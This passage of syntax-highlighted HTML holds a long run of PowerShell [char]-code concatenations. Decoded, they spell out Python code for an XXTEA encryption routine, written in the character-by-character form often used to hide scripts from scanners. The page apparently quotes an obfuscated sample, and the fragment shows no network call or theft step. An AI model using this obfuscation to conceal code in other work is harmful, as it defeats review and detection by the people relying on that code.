class="hljs-selector-attr">[CHar]</span><span class="hljs-number">60</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">92</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">94</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">60</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">60</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">94</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">92</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">38</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">94</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">94</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">94</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">47</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">47</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">119</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span 